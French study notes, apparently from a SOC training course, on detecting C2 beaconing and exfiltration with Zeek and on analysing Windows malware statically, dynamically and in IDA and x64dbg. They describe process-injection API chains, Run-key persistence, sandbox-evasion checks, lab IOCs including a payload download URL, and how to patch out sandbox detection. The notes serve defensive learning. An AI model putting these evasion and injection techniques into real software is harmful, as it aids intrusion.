Le beaconing est un comportement r√©p√©t√© utilis√© par les malwares pour communiquer avec un serveur de commande et contr√¥le (C2). On peut d√©tecter ce comportement en analysant les connexions dans le fichier conn.log, en rep√©rant les connexions r√©p√©titives vers la m√™me adresse IP, avec des tailles de donn√©es constantes ou des intervalles r√©guliers.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
cat conn.log
Analyse :
Le fichier conn.log montre des connexions r√©guli√®res toutes les 5 secondes vers l‚ÄôIP 51.15.197.127:80, typiques du malware PowerShell Empire.

Exemple 2 : D√©tection d‚Äôexfiltration de donn√©es via DNS

L‚Äôexfiltration via DNS imite le trafic normal, mais peut √™tre d√©tect√©e en analysant les fichiers files.log ou dns.log de Zeek √† la recherche de transferts de donn√©es importants ou de canaux cach√©s. Le fichier dns.log peut r√©v√©ler des domaines ou sous-domaines suspects.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
Analyse :
Des sous-domaines fr√©quents comme 456c54f2.blue.letsgohunt.online indiquent un possible tunneling DNS.

Exemple 3 : D√©tection d‚Äôexfiltration de donn√©es via TLS

L‚Äôexfiltration via TLS peut √™tre identifi√©e en rep√©rant de grands volumes de donn√©es envoy√©es entre certaines machines. On analyse conn.log en filtrant et en agr√©geant les donn√©es pour d√©tecter des tailles anormales.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
cat conn.log | /usr/local/zeek/bin/zeek-cut id.origh id.resph origbytes | \
sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
Analyse :
Cette commande r√©v√®le l‚Äôenvoi d‚Äôenviron 270 Mo de donn√©es √† l‚Äôadresse 192.168.151.181.

Exemple 4 : D√©tection d‚Äôactivit√© PsExec

PsExec est souvent utilis√© pour l‚Äôadministration √† distance et dans les attaques. Quand il est utilis√© via SMB, les fichiers smbfiles.log, dcerpc.log et smbmapping.log peuvent r√©v√©ler son activit√©.

Commande :

/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexecadduser.pcap
cat smbfiles.log
cat dcerpc.log
cat smb_mapping.log
Analyse :
Ces journaux montrent le transfert et l‚Äôex√©cution du fichier PSEXESVC.exe, ce qui correspond au comportement typique de PsExec.

R√©sum√© des outils et commandes utilis√©s
zeek-cut : extrait des colonnes sp√©cifiques des journaux Zeek.
sort : trie les donn√©es pour faciliter l‚Äôanalyse.
grep : filtre les r√©sultats.
datamash : permet d‚Äôagr√©ger les donn√©es (somme, regroupement, etc.).

Ces outils permettent de mettre en √©vidence des sch√©mas de comportement suspects dans les journaux r√©seau. Leur utilisation combin√©e avec Zeek ou Wireshark permet une analyse fine du trafic.</code></pre></div></details></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction to Malware Analysis</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Introduction To Malware &amp; Malware Analysis part1</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8029-baa0-e78551b6b9cd"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction √† l‚ÄôAnalyse de Malware

Ce module fournit les bases essentielles pour permettre aux analystes SOC de comprendre, d√©tecter et analyser les malwares, en se concentrant principalement sur ceux con√ßus pour les syst√®mes Windows.

Types de Malware
Virus : Infectent des fichiers l√©gitimes et se propagent en s‚Äôy attachant.
Worms (vers) : Se r√©pliquent automatiquement via les r√©seaux, sans interaction humaine.
Trojans (chevaux de Troie) : D√©guis√©s en logiciels fiables, ils permettent un acc√®s non autoris√©.
Ransomware : Chiffrent les donn√©es et exigent une ran√ßon pour leur restitution.
Spyware : Espionnent l‚Äôutilisateur en collectant des donn√©es √† son insu (mots de passe, historique, etc.).
Adware : Affichent des publicit√©s invasives et peuvent suivre les activit√©s en ligne.
Botnets : R√©seaux d‚Äôordinateurs compromis utilis√©s pour lancer des attaques ou propager d‚Äôautres malwares.
Rootkits : Prennent le contr√¥le de composants du syst√®me pour dissimuler des activit√©s malveillantes.
Backdoors / RATs : Ouvrent un acc√®s √† distance permanent au syst√®me infect√©.
Droppers : Installeurs furtifs utilis√©s pour d√©ployer d'autres charges malveillantes.
Information Stealers : Con√ßus pour d√©rober des donn√©es sensibles (identifiants, informations personnelles, etc.).

Sources de Samples (√âchantillons de Malware)

L‚Äôanalyse de malware doit toujours s‚Äôeffectuer dans un environnement isol√© et s√©curis√©. Voici quelques plateformes fiables pour se procurer des √©chantillons :
VirusShare
Hybrid Analysis
TheZoo (GitHub)
Malware-Traffic-Analysis.net
VirusTotal
ANY.RUN
Contagio Malware Dump
VX Underground

Acquisition de Malware / Preuves Num√©riques

Lors d‚Äôune enqu√™te, la capture du disque et de la m√©moire vive est cruciale pour collecter des preuves.
Outils d‚ÄôImagerie Disque :
FTK Imager : R√©f√©rence dans la cr√©ation d‚Äôimages forensiques.
OSFClone : Outil open source compatible avec divers syst√®mes de fichiers.
DD / DCFLDD : Utilitaires en ligne de commande tr√®s utilis√©s sous Linux pour la copie bit √† bit.
Outils d‚ÄôAcquisition de M√©moire Vive :
DumpIt : Simple d‚Äôutilisation pour les syst√®mes Windows/Linux.
MemDump : Utilitaire en ligne de commande pour la capture RAM.
Belkasoft RAM Capturer : Sp√©cialis√© dans la r√©cup√©ration m√©moire m√™me face √† l‚Äôanti-debugging.
Magnet RAM Capture : Outil ergonomique de Magnet Forensics.
LiME (Linux Memory Extractor) : Parfait pour l‚Äôanalyse de la m√©moire volatile sous Linux.
Autres outils utiles :
KAPE : Pour la collecte cibl√©e d‚Äôart√©facts.
Velociraptor : Outil d‚Äôinvestigation bas√© sur une requ√™te personnalisable (VQL).

D√©finition, Objectifs et M√©thodes de l‚ÄôAnalyse de Malware

L‚Äôanalyse de malware consiste √† √©tudier un logiciel malveillant pour comprendre son fonctionnement, sa source, et son impact. Elle contribue √† :
Renforcer les capacit√©s de d√©tection,
Mener du reverse engineering,
Collecter de l‚Äôintelligence sur les menaces.
Objectifs Principaux :
D√©tection et Classification : Identifier le type de malware et cr√©er des r√®gles de d√©tection.
Reverse Engineering : D√©sassembler le code pour en comprendre la logique, les m√©thodes de chiffrement et les m√©canismes de communication avec un C2.
Analyse Comportementale : Observer les actions du malware sur le syst√®me (fichiers cr√©√©s, connexions, processus, etc.).
Renseignement sur la menace (Threat Intel) : Identifier les tactiques, techniques et infrastructures utilis√©es par les attaquants.

Techniques Courantes d‚ÄôAnalyse
Analyse Statique : √âtude du fichier sans l‚Äôex√©cuter pour rep√©rer des √©l√©ments cl√©s (signatures, cha√Ænes, imports).
Analyse Dynamique : Ex√©cution du malware dans un environnement contr√¥l√© pour observer son comportement.
Analyse de Code : Reverse engineering pour explorer en profondeur les fonctions et structures du malware.
Analyse M√©moire : Inspection de la RAM pour d√©tecter du code inject√© ou des comportements actifs.
D√©compactage de Malware : Extraction du vrai code masqu√© par un packer ou un crypteur.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Windows Internals</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80ef-b037-fd7f24abd37e"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Comprendre les Internes de Windows pour l‚ÄôAnalyse de Malware

La compr√©hension des m√©canismes internes de Windows est essentielle pour analyser efficacement les malwares. Cela permet d‚Äôinterpr√©ter leur comportement, d‚Äôidentifier leurs points d‚Äôancrage dans le syst√®me, et de d√©tecter leurs m√©thodes de persistance ou d‚Äô√©vasion.

Modes de Fonctionnement de Windows
Mode Utilisateur (User Mode)
  Acc√®s restreint ; utilis√© par les applications.
  ‚Üí Le malware peut manipuler les fichiers, le registre ou chercher √† √©lever ses privil√®ges.
Mode Noyau (Kernel Mode)
  Acc√®s total au syst√®me et au mat√©riel.
  ‚Üí Les malwares en mode noyau peuvent modifier le comportement de Windows, intercepter des appels syst√®me et se cacher plus efficacement.

Architecture de Windows
Composants en Mode Utilisateur
Processus Syst√®me : ex. winlogon.exe, smss.exe, services.exe.
Services : t√¢ches en arri√®re-plan comme Windows Update ou le Planificateur.
Applications Utilisateur : communiquent avec le noyau via les API (NTDLL.DLL).
Sous-syst√®mes d‚Äôenvironnement : ex. Win32, POSIX.
DLL de Sous-syst√®me : font le lien entre fonctions document√©es et appels natifs (kernelbase.dll, user32.dll, etc.).
Composants en Mode Noyau
Executive : G√®re I/O, processus, objets, s√©curit√©.
Kernel : Planification des t√¢ches, synchronisation.
Pilotes : Interface entre Windows et le mat√©riel.
HAL (Hardware Abstraction Layer) : Abstraction du mat√©riel.
Win32k.sys : G√®re l‚Äôinterface graphique.

Flux des Appels API Windows

Les malwares utilisent fr√©quemment les API Windows pour interagir avec le syst√®me.
Exemple d‚Äôappel : ReadProcessMemory
Flux d‚Äôex√©cution :
  kernel32.dll ‚Üí ntdll.dll ‚Üí NtReadVirtualMemory ‚Üí Appel syst√®me au noyau.
SSDT (System Service Descriptor Table) :
  G√®re la correspondance entre les appels syst√®me et les fonctions du noyau.

Format PE (Portable Executable)

Le format PE est utilis√© pour les .exe, .dll, etc.
Comprendre sa structure est fondamental pour identifier du code malveillant.
Sections courantes :
.text : Code ex√©cutable.
.data : Variables initialis√©es.
.rdata : Donn√©es constantes.
.pdata : Gestion des exceptions.
.bss : Donn√©es non initialis√©es.
.rsrc : Ressources (ic√¥nes, images).
.idata : Fonctions import√©es.
.edata : Fonctions export√©es.
.reloc : Donn√©es de relocalisation.

 L‚Äôanalyse de ces sections permet d‚Äôobserver le comportement interne du malware, les fonctions appel√©es, et les ressources int√©gr√©es.

Processus Windows

Un processus est une instance d‚Äôun programme en ex√©cution, avec ses propres ressources syst√®me :
PID : Identifiant unique.
Espace m√©moire virtuel : Code, donn√©es, pile, etc.
Code ex√©cutable : Instructions charg√©es depuis le disque.
Handles : R√©f√©rences vers fichiers, registres, etc.
Contexte de s√©curit√© : Jeton d√©finissant les droits.
Threads : Unit√©s d'ex√©cution parall√®les au sein d‚Äôun processus.

 Suivre ces √©l√©ments aide √† rep√©rer les comportements suspects d‚Äôun malware.

Biblioth√®ques Dynamiques (DLL)

Les DLL contiennent des fonctions partag√©es utilis√©es √† la fois par Windows et les malwares.
Fonctions Import√©es

Charg√©es dynamiquement pour interagir avec le syst√®me.

 Exemple d‚Äôinjection de code :
OpenProcess
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
Fonctions Export√©es

Expos√©es par une DLL pour √™tre utilis√©es par d'autres processus.

 Exemple : Les exports de kernel32.dll visibles avec CFF Explorer ou x64dbg r√©v√®lent des appels syst√®me cl√©s.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Static Analysis On Linux</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8062-8d99-c827c1692652"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Statique de Malware

L‚Äôanalyse statique consiste √† examiner un fichier malveillant sans l‚Äôex√©cuter. Cette m√©thode permet de recueillir des informations essentielles sur l‚Äô√©chantillon, telles que son type, ses cha√Ænes de caract√®res, ses empreintes (hashes), les √©l√©ments int√©gr√©s, et les signes de compression ou d‚Äôobfuscation. Elle constitue une √©tape fondamentale avant l‚Äôanalyse dynamique ou le reverse engineering.

√âl√©ments Cl√©s de l‚ÄôAnalyse Statique
Type de fichier : Permet de v√©rifier la vraie nature du fichier, ind√©pendamment de son extension.
Empreintes (hashes) : Un identifiant unique permettant de tracer ou comparer un √©chantillon.
Cha√Ænes de caract√®res (strings) : Donnent des indices sur le comportement ou les cibles du malware.
√âl√©ments int√©gr√©s : Domaines, chemins syst√®me, noms de fichiers, etc.
Pr√©sence d‚Äôun packer : Les packers compriment ou chiffrent les malwares pour masquer leur contenu.
Fonctions import√©es/export√©es : R√©v√®lent les API Windows utilis√©es.
Code assembleur : Fournit une vision bas niveau sur le fonctionnement du binaire.

Identification du Type de Fichier

Pour d√©terminer le type r√©el du fichier :

file /chemin/vers/malware.exe
Exemple de r√©sultat :

PE32 executable (GUI) Intel 80386, for MS Windows
V√©rification du header :

hexdump -C /chemin/vers/malware.exe | more
Cherchez la signature "MZ" (hexad√©cimal 4D 5A) pour confirmer un ex√©cutable Windows.

Empreintes et "Fingerprinting"
Hashs de fichiers

Pour g√©n√©rer un identifiant unique du fichier :

md5sum /chemin/vers/malware.exe
sha256sum /chemin/vers/malware.exe
Utilisez ces valeurs sur des bases comme [VirusTotal](https://virustotal.com) pour croiser les informations.
Empreinte des Imports (IMPHASH)

L‚ÄôIMPHASH identifie des malwares similaires en se basant sur leurs fonctions import√©es.

Exemple en Python :

import sys
import pefile

pe = pefile.PE(sys.argv[1])
print(pe.getimphash())
Ex√©cution :

python3 imphashcalc.py /chemin/vers/malware.exe
Fuzzy Hashing avec SSDEEP

Pour mesurer la similarit√© entre fichiers :

ssdeep /chemin/vers/malware.exe
Hash des Sections PE

Analyser s√©par√©ment chaque section (.text, .data, etc.) permet de d√©tecter des modifications mineures.

Exemple Python :

import sys
import pefile

pe = pefile.PE(sys.argv[1])
for section in pe.sections:
    print(section.Name, "MD5 :", section.gethashmd5())
    print(section.Name, "SHA256 :", section.gethashsha256())
Ex√©cution :

python3 sectionhashing.py /chemin/vers/malware.exe
Analyse de Cha√Ænes de Caract√®res

Les cha√Ænes ASCII/Unicode extraites peuvent contenir :
Noms de fichiers
IP, domaines
Fonctions API
Cl√©s de registre

Commande pour extraire les cha√Ænes longues :

strings -n 15 /chemin/vers/malware.exe
Pour d√©tecter des cha√Ænes obfusqu√©es :

floss /chemin/vers/malware.exe
D√©tection et D√©compression de Malware Pack√© (UPX)

Les malwares pack√©s masquent leur code. Le mot-cl√© "UPX" dans les cha√Ænes peut indiquer l'utilisation de ce packer.
D√©compresser un ex√©cutable UPX :

upx -d -o /chemin/vers/unpackedmalware.exe /chemin/vers/malware.exe
Puis relancez l‚Äôanalyse :

strings /chemin/vers/unpacked_malware.exe</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Static Analysis On Windows</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80eb-af1e-ff59e6ce6d16"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Statique de Malware sur Windows

L‚Äôanalyse statique sous Windows suit les m√™mes principes que sous Linux, mais utilise des outils sp√©cifiques √† l‚Äôenvironnement Windows pour examiner les fichiers malveillants sans les ex√©cuter. Cette m√©thode permet d‚Äôidentifier des √©l√©ments cl√©s comme le type de fichier, les empreintes (hashes), les cha√Ænes de caract√®res et d‚Äô√©ventuelles traces d‚Äôobfuscation ou de compression.

√âl√©ments Cl√©s de l‚ÄôAnalyse Statique sous Windows
Identification du type de fichier : V√©rifie qu‚Äôil s‚Äôagit bien d‚Äôun ex√©cutable Windows (fichier PE).
Hashing : G√©n√©ration de hash MD5/SHA256 pour suivre et comparer les √©chantillons.
IMPHASH : Hachage bas√© sur les fonctions import√©es, utile pour d√©tecter des variantes.
Fuzzy Hashing (SSDEEP) : Compare la similarit√© entre diff√©rents fichiers.
Hash des sections : Permet de rep√©rer des alt√©rations dans les sections PE.
Analyse de cha√Ænes de caract√®res : Permet d‚Äôidentifier des √©l√©ments utiles comme des IP, chemins syst√®me ou appels API.
D√©packaging : Permet d‚Äôextraire le contenu r√©el d‚Äôun malware pack√© avec UPX.

V√©rification du Type de Fichier

Utilise CFF Explorer (C:\Tools\Explorer Suite) pour analyser la structure du fichier. V√©rifie la pr√©sence de la signature ASCII "MZ" dans l‚Äôen-t√™te pour confirmer qu‚Äôil s‚Äôagit d‚Äôun ex√©cutable Windows.

Empreintes et "Fingerprinting"
G√©n√©ration de Hashs avec PowerShell

Get-FileHash -Algorithm MD5 C:\Samples\MalwareAnalysis\malware.exe
Get-FileHash -Algorithm SHA256 C:\Samples\MalwareAnalysis\malware.exe
Calcul de l‚ÄôIMPHASH

Script Python avec le module pefile :

import sys
import pefile

pefile = sys.argv[1]
pe = pefile.PE(pefile)
print(pe.getimphash())
Ex√©cution :

python imphashcalc.py C:\Samples\MalwareAnalysis\malware.exe
Fuzzy Hashing avec SSDEEP

C:\Tools\ssdeep-2.14.1\ssdeep.exe C:\Samples\MalwareAnalysis\malware.exe
Hash des Sections PE (Python)

Script d‚Äôexemple :

import sys
import pefile

pefile = sys.argv[1]
pe = pefile.PE(pefile)
for section in pe.sections:
    print(section.Name, "MD5 hash:", section.gethashmd5())
    print(section.Name, "SHA256 hash:", section.gethashsha256())
Outil graphique alternatif : PEStudio
(C:\Tools\pestudio\pestudio)

Analyse de Cha√Ænes de Caract√®res
Extraction des cha√Ænes :

C:\Sysinternals\strings.exe C:\Samples\MalwareAnalysis\malware.exe
Pour les cha√Ænes obfusqu√©es :

C:\FLOSS\floss.exe C:\Samples\MalwareAnalysis\malware.exe
D√©compression de Malware Pack√© avec UPX

Rechercher la pr√©sence de "UPX" dans les cha√Ænes extraites est un bon indicateur d‚Äôun fichier pack√©.
D√©compression :

C:\Tools\upx\upx-4.0.2-win64\upx.exe -d -o unpackedmalware.exe C:\Samples\MalwareAnalysis\packed\malware.exe
Puis relancer l‚Äôanalyse :

C:\Sysinternals\strings.exe unpackedmalware.exe</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Dynamic Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-80b5-af99-fd2c8f859ec9"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Analyse Dynamique des Malwares

L‚Äôanalyse dynamique consiste √† observer le comportement d‚Äôun malware en l‚Äôex√©cutant dans un environnement contr√¥l√©. Contrairement √† l‚Äôanalyse statique, qui examine le fichier sans l‚Äôex√©cuter, cette m√©thode permet de voir en temps r√©el les modifications apport√©es au syst√®me.

√âtapes Cl√©s de l‚ÄôAnalyse Dynamique
Mise en Place de l‚ÄôEnvironnement

Cr√©ez une machine virtuelle isol√©e pour ex√©cuter le malware sans risque pour le reste du r√©seau. Il est essentiel de simuler un environnement r√©aliste : applications courantes, donn√©es utilisateur, configuration r√©seau fonctionnelle.
Capture de l‚Äô√âtat Initial

Avant d‚Äôex√©cuter le malware, prenez un instantan√© du syst√®me : √©tat des fichiers, registre Windows, processus actifs, configurations r√©seau. Cette base servira √† comparer les changements provoqu√©s par l‚Äôex√©cution du malware.
D√©ploiement des Outils (Pr√©-Ex√©cution)

Installez et configurez des outils de surveillance comme :
ProcMon (Sysinternals) : journalisation des acc√®s fichiers, modifications du registre, cr√©ation de processus, etc.
Wireshark / tcpdump : capture du trafic r√©seau.
Regshot : comparaison de l‚Äô√©tat du registre avant/apr√®s.
INetSim, FakeDNS, FakeNet-NG : √©mulation de services r√©seau pour interagir avec le malware.
Ex√©cution du Malware

Lancez le malware avec les outils de surveillance actifs. Laissez-le s‚Äôex√©cuter assez longtemps pour observer ses actions, sans intervenir.
Observation et Journalisation

Surveillez :
La cr√©ation de processus,
Les modifications de fichiers et du registre,
Les communications r√©seau.
Analyse Post-Ex√©cution

Une fois le malware arr√™t√© :
Comparez l‚Äô√©tat du syst√®me avec le snapshot initial.
Recherchez les anomalies : fichiers cr√©√©s, cl√©s registre modifi√©es, processus suspects, connexions externes.

Analyse Dynamique avec Noriben

Noriben est un script Python qui automatise l‚Äôutilisation de ProcMon en filtrant les donn√©es inutiles pour mettre en √©vidence les comportements suspects.
√âtapes d‚ÄôUtilisation de Noriben
Lancer Noriben :

   cd C:\Tools\Noriben-master
   python Noriben.py
   D√©marrage de ProcMon : Noriben lance ProcMon avec des filtres pr√©d√©finis.
Ex√©cution du Malware :
   Ex√©cutez par exemple shell.exe dans C:\Samples\MalwareAnalysis.
Arr√™ter l‚ÄôEnregistrement :
   Dans le terminal Noriben, utilisez Ctrl+C pour stopper la capture.
Analyser le Rapport :
   Noriben g√©n√®re un fichier .txt contenant un r√©sum√© des actions suspectes class√©es par type (fichiers, registre, processus, r√©seau).

Analyse Fine avec ProcMon Directement

Si Noriben filtre trop d‚Äôinformations, il peut √™tre utile d‚Äôutiliser ProcMon manuellement :
√âtapes :
Ouvrir ProcMon :
   Depuis C:\Tools\sysinternals.
Configurer les Filtres :
Ctrl+L pour acc√©der aux filtres.
Exemple : Process Name is shell.exe.
Ex√©cuter le Malware :
   Lancez de nouveau le malware pour enregistrer ses activit√©s.
Analyser les Comportements de D√©tection :
   Certains malwares peuvent interroger des cl√©s de registre li√©es √† VMware (ex : SOFTWARE\VMware, Inc.) pour d√©tecter une sandbox.

Outils Compl√©mentaires pour l‚ÄôAnalyse Dynamique
Sandboxes automatis√©es :
Cuckoo Sandbox,
Joe Sandbox,
FireEye DTI Cloud, etc.

 Certains malwares avanc√©s d√©tectent ces environnements et modifient leur comportement pour √©viter la d√©tection.

Exemples de Commandes
Lancer Noriben :

  python Noriben.py
  Utiliser ProcMon :
Lancer ProcMon.
Ctrl+L ‚Üí Ajouter un filtre : Process Name is shell.exe.
Observer les entr√©es : acc√®s registre, fichiers, processus, connexions r√©seau.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Code Analysis</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8084-b02a-f3c9785989b8"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">L'ing√©nierie inverse permet aux analystes de comprendre la fonctionnalit√© et le comportement d'un malware en diss√©quant son code machine compil√©. Cela implique g√©n√©ralement de convertir le code machine en langage assembleur et d'interpr√©ter les op√©rations sans les ex√©cuter.

Lors de l'analyse de code, notre objectif est de :
Dissocier le code pour examiner sa structure et sa logique sans d√©clencher d'actions.
Identifier les fonctions cl√©s et les √©ventuels Indicateurs de Compromission (IOCs).
Explorer le flux de contr√¥le pour rep√©rer des fonctions critiques, telles que la d√©tection de sandbox et les m√©canismes de persistance.
Outils pour l'Analyse de Code
D√©sassembleurs : Utilis√©s pour l'analyse statique du code machine (par exemple, IDA, Ghidra, Cutter).
D√©bogueurs : Permettent l'ex√©cution interactive du code et le contr√¥le de celui-ci (par exemple, x32dbg, x64dbg, OllyDbg).
Exemple d'Analyse de Code : shell.exe

L'√©chantillon de malware shell.exe illustre diverses techniques, telles que la d√©tection de sandbox et l'injection de processus, qui peuvent √™tre d√©cod√©es par d√©sassemblage dans IDA.
Importation et D√©sassemblage de shell.exe dans IDA
Charger shell.exe dans IDA :
Ouvrir IDA en mode administrateur.
Charger l'ex√©cutable et laisser IDA analyser le fichier binaire.
Naviguer dans les vues :
Graph View : Visualise le flux de contr√¥le des fonctions, facilitant l'identification des chemins d'ex√©cution et de leurs relations.
Text View : Affiche le code assembleur ligne par ligne avec les adresses m√©moire, utile pour un examen d√©taill√© des instructions.
Zones Cl√©s d'Analyse
Identifier la fonction principale :
La fonction de d√©marrage dans IDA montre la configuration initiale. Suivre les appels et les sauts pour localiser la fonction principale. Cela peut inclure des t√¢ches d'initialisation et de configuration des cadres de pile.
Techniques de d√©tection de sandbox :
L'√©chantillon shell.exe interroge le registre pour d√©tecter la pr√©sence de VMware Tools (indicateur d'un environnement virtuel). Les fonctions RegOpenKeyExA et RegQueryValueExA dans le d√©sassemblage r√©v√®lent la d√©tection de sandbox bas√©e sur le registre.
IDA montre le chemin de la fonction :

    lea rdx, aSoftwareVmware
    mov rcx, 0FFFFFFFF80000002h
    call cs:RegOpenKeyExA
    IOC possible : Cl√© de registre SOFTWARE\VMware, Inc.\VMware Tools.
M√©canismes de temporisation :
Les appels √† GetSystemTimeAsFileTime, GetCurrentProcessId, et QueryPerformanceCounter peuvent indiquer des m√©canismes de temporisation, potentiellement utilis√©s pour des d√©lais ou des v√©rifications.
IDA affiche √©galement des instructions de sommeil ou des boucles de retard utilis√©es par le malware pour √©viter la d√©tection.
Connexions r√©seau :
L'√©chantillon shell.exe utilise getaddrinfo et WSAStartup pour les op√©rations r√©seau. Il peut v√©rifier la connectivit√© r√©seau pour √©viter les restrictions de la sandbox.
IOC exemple : Domaine iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com.
M√©canismes de persistance :
L'√©chantillon √©crit des entr√©es dans la cl√© de registre SOFTWARE\Microsoft\Windows\CurrentVersion\Run pour assurer la persistance.
IOC potentiel : Cl√© de registre avec l'entr√©e pour svchost.exe sous WindowsUpdater.
Injection de processus :
shell.exe cr√©e un processus notepad.exe, alloue de la m√©moire √† l'int√©rieur de ce dernier via VirtualAllocEx, puis injecte du shellcode en utilisant WriteProcessMemory, suivi de l'appel √† CreateRemoteThread.
Fonctions d'injection observ√©es :

    call VirtualAllocEx
    call WriteProcessMemory
    call CreateRemoteThread
    Utilisation des Graphes de Flux de Fonction et des Xref dans IDA
G√©n√©ration d'un graphe de flux d'appel de fonction :
IDA peut visualiser les relations entre fonctions via View ‚Üí Graphs ‚Üí Function calls.
Graphes sp√©cifiques aux fonctions : Faire un clic droit dans la vue de d√©sassemblage, puis s√©lectionner soit Xrefs graph to... ou Xrefs graph from... pour voir les appels de fonction sp√©cifiques.
Strat√©gie de D√©bogage pour shell.exe
Placer des points d'arr√™t :
Ajouter des points d'arr√™t sur des appels d'API cl√©s (par exemple, RegOpenKeyExA, VirtualAllocEx).
Contr√¥le du flux d'ex√©cution :
Passer √©tape par √©tape dans le code pour observer le comportement en temps r√©el et valider les v√©rifications de sandbox ou les m√©canismes de persistance suspect√©s.
Analyse dynamique post-d√©sassemblage :
Le d√©bogage apr√®s le d√©sassemblage permet de valider les conclusions initiales et de confirmer les comportements associ√©s aux IOCs.
IOCs Identifi√©s
D√©tection de sandbox bas√©e sur le registre :
Cl√© de registre : SOFTWARE\VMware, Inc.\VMware Tools.
V√©rification de la connectivit√© r√©seau :
Domaine : iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea\[.]com.
Adresse IP : 45.33.32.156.
Port : 31337.
Technique de persistance :
Cl√© de registre : SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
Ex√©cutable : svchost.exe dans le r√©pertoire TEMP.
Ressource r√©seau externe :
URL : http\[:]//ms-windows-update\[.]com/svchost\[.]exe.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Debugging</strong></summary><div class="indented"><pre class="code code-wrap" id="1ea25200-7eb4-8057-ab39-c286bb133d8c"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">D√©bogage dans l'Analyse de Malware

Le d√©bogage est une approche interactive de l'analyse de malware qui permet d'examiner le comportement du code en temps r√©el. En combinant les informations obtenues via des outils d'analyse statique comme IDA avec des techniques de d√©bogage, les analystes peuvent obtenir une vue d'ensemble du fonctionnement du malware, des m√©canismes d'√©vasion de sandbox et des indicateurs de compromission (IOCs).

Outils de D√©bogage
x64dbg

x64dbg est un d√©bogueur permettant l'analyse et le contr√¥le d'ex√©cutables 64 bits. Il offre plusieurs fonctionnalit√©s utiles :
Vue de d√©sassemblage : Affiche le code assembleur du programme.
Vue des registres et de la pile : Montre les valeurs actuelles des registres CPU et la pile d'appel.
Dump m√©moire : Visualise la m√©moire du programme pour analyser les structures de donn√©es et les variables.
INetSim

INetSim permet de simuler des services internet dans un environnement contr√¥l√©, permettant au malware d'interagir avec des services fictifs (DNS, HTTP, etc.) sans risques. Cela permet de reproduire des environnements d'exploitation r√©seau sans danger.

Configurer le D√©bogage avec x64dbg
Charger shell.exe dans x64dbg
Lancez x64dbg et s√©lectionnez Fichier &gt; Ouvrir.
Naviguez jusqu'√† shell.exe et ouvrez-le.
Le programme s'arr√™te √† son point d'entr√©e dans la vue de d√©sassemblage, avec un point d'arr√™t par d√©faut.
Pour commencer l'ex√©cution, appuyez sur F9 ou cliquez sur Run.
Simuler des Services Internet avec INetSim

INetSim permet de configurer des services internet fictifs, capturant et r√©pondant aux requ√™tes r√©seau du malware.
Configurer INetSim
√âditer la configuration :

   sudo nano /etc/inetsim/inetsim.conf
   R√©glez servicebindaddress et dnsdefaultip sur l'adresse IP de la machine.
Configurez les valeurs DNS par d√©faut :

     dnsdefaulthostname www
     dnsdefaultdomainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
     Lancer INetSim :

   sudo inetsim
   Assurez-vous que le DNS de la cible pointe vers la machine o√π INetSim est en cours d'ex√©cution.

Contourner les V√©rifications de Sandbox

Les malwares v√©rifient souvent s'ils sont ex√©cut√©s dans un environnement virtuel ou de sandbox avant de s'ex√©cuter pleinement. Voici comment contourner ces v√©rifications dans x64dbg.
√âtapes pour Contourner les V√©rifications de Sandbox
Copier l'adresse depuis IDA :
Dans IDA, identifiez l'adresse de l'instruction cmp pour les v√©rifications du registre.
Utilisez Go to &gt; Expression dans x64dbg (Ctrl+G) pour localiser cette adresse.
Identifier et patcher l'instruction de comparaison :
Trouvez l'instruction cmp li√©e √† la d√©tection de Sandbox (par exemple, √† l'adresse 0x4032C8).
Modifiez cmp [rsp+148h+Type], 1 en cmp [rsp+148h+Type], 0 en utilisant la barre d'espace pour √©diter.
Patch des cha√Ænes li√©es au Sandbox :
Recherchez &gt; Current Module &gt; String references pour trouver Sandbox detected.
D√©finissez des points d'arr√™t sur des cha√Ænes comme 0x4032F13, puis modifiez les sauts conditionnels (par exemple, changez je en jne).
Patch et Sauvegarde de l'Ex√©cutable Modifi√©

Une fois le patch appliqu√© :
Sauvegarder l'ex√©cutable modifi√© :
Appuyez sur Ctrl+P dans x64dbg et s√©lectionnez Patch File.

